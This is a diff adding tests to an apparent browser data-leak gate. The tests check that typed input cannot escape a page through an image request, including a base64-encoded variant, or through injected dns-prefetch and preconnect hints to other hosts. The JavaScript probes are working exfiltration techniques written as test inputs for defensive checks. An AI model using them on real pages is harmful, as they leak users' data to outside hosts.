@@ -36,6 +36,8 @@ STYLE_JS = """new Promise((done) => { const l = document.createElement("link"); 
   l.onerror = () => done("failed"); document.head.appendChild(l); })"""
 LEAK_JS = """new Promise((done) => { const i = new Image(); i.onload = () => done("loaded");
   i.onerror = () => done("failed"); i.src = "https://www.google.com/favicon.ico?e=" + encodeURIComponent("%s"); })""" % EMAIL
+# The same value in base64, as a page would hide it.
+LEAK_B64_JS = LEAK_JS.replace('encodeURIComponent("%s")' % EMAIL, 'btoa("%s")' % EMAIL)
 SOCKET_JS = """new Promise((done) => { let s; try { s = new WebSocket("wss://ws.postman-echo.com/raw"); }
   catch (e) { return done("refused"); }
   s.onopen = () => { s.send("x"); done("open"); }; s.onerror = () => done("failed");
@@ -131,6 +133,13 @@ async def gate_checks(session_id: str) -> list:
     try:
         leaked = await browser_cdp.evaluate(client, tab, LEAK_JS)
         results.append(report("an image carrying what she typed is stopped", leaked == "failed"
+                              and gate.breach == browser_gate.LEAK, f"{leaked}, gate {gate.breach}"))
+    finally:
+        await client.stop()
+    client, gate, tab = await _fresh(session_id)
+    try:
+        leaked = await browser_cdp.evaluate(client, tab, LEAK_B64_JS)
+        results.append(report("and one carrying it in base64", leaked == "failed"
                               and gate.breach == browser_gate.LEAK, f"{leaked}, gate {gate.breach}"))
     finally:
         await client.stop()
@@ -237,6 +246,45 @@ async def frame_checks(session_id: str) -> list:
         finally:
             await client.stop()
     return results
+
+
+# Every way a script puts a hint to open a name or a connection to another host into the page.
+HINT_WAYS = {
+    "appended": "const l = document.createElement('link'); l.rel = 'preconnect'; l.href = 'https://x1.example.net'; "
+                "document.head.appendChild(l)",
+    "written as markup": "document.body.insertAdjacentHTML('beforeend', '<link rel=dns-prefetch href=//x2.example.net>'); "
+                         "document.body.innerHTML += '<link rel=preconnect href=https://x3.example.net>'",
+    "its rel changed in place": "const l = document.createElement('link'); l.href = 'https://x4.example.net'; "
+                                "document.head.appendChild(l); l.setAttribute('rel', 'preconnect'); "
+                                "l.relList.add('dns-prefetch'); l.attributes.rel && (l.attributes.rel.value = 'preconnect')",
+    "its href changed in place": "const l = document.createElement('link'); l.rel = 'preconnect'; l.href = '/own'; "
+                                 "document.head.appendChild(l); l.href = 'https://x5.example.net'",
+    "from a fresh frame": "const f = document.body.appendChild(document.createElement('iframe')); "
+                          "f.contentDocument.head.innerHTML = '<link rel=preconnect href=https://x6.example.net>'",
+}
+HINTS_LEFT_JS = """(() => { const docs = [document, ...[...document.querySelectorAll("iframe")].map((f) => {
+  try { return f.contentDocument; } catch (e) { return null; } }).filter(Boolean)];
+  return docs.flatMap((d) => [...d.querySelectorAll("link")]).filter((l) =>
+    /(dns-prefetch|preconnect)/i.test(l.getAttribute("rel") || "") && l.href
+    && new URL(l.href).hostname !== location.hostname).map((l) => l.href); })()"""
+
+
+async def hint_checks(session_id: str) -> list:
+    from app.integrations import browser_cdp
+    left = {}
+    client, gate, tab = await _fresh(session_id)
+    try:
+        for name, js in HINT_WAYS.items():
+            await browser_cdp.evaluate(client, tab, "(() => { " + js + "; return true; })()")
+            left[name] = await browser_cdp.evaluate(client, tab, HINTS_LEFT_JS)
+        await browser_cdp.evaluate(client, tab, "(() => { const l = document.createElement('link'); "
+                                   "l.rel = 'preconnect'; l.href = location.origin + '/x'; "
+                                   "document.head.appendChild(l); return true; })()")
+        own = await browser_cdp.evaluate(client, tab, "document.querySelectorAll(\"link[rel=preconnect][href$='/x']\").length")
+    finally:
+        await client.stop()
+    return [report("no hint to another host gets into a page, " + name, found == [], str(found))
+            for name, found in left.items()] + [report("a hint to the page's own host stays", own == 1, str(own))]
 
 
 def live_view(debug_url: str) -> bool:
@@ -367,6 +415,9 @@ def main() -> int:
     from app.bootstrap import configure_logging
     from app.integrations import steel_client
     configure_logging("WARNING")
+    from app.integrations import browser_cdp
+    # This check opens a dozen connections in a row; Steel was slow to open them on 3 Nov 2026.
+    browser_cdp.CONNECT_TRIES = 6
     if not steel_client.configured():
         print("no STEEL_API_KEY")
         return 2
@@ -376,6 +427,7 @@ def main() -> int:
     try:
         results += asyncio.run(gate_checks(session["id"]))
         results += asyncio.run(frame_checks(session["id"]))
+        results += asyncio.run(hint_checks(session["id"]))
         results.append(live_view(session["debug_url"]))
     finally:
         steel_client.release(session["id"], time.monotonic() - began)
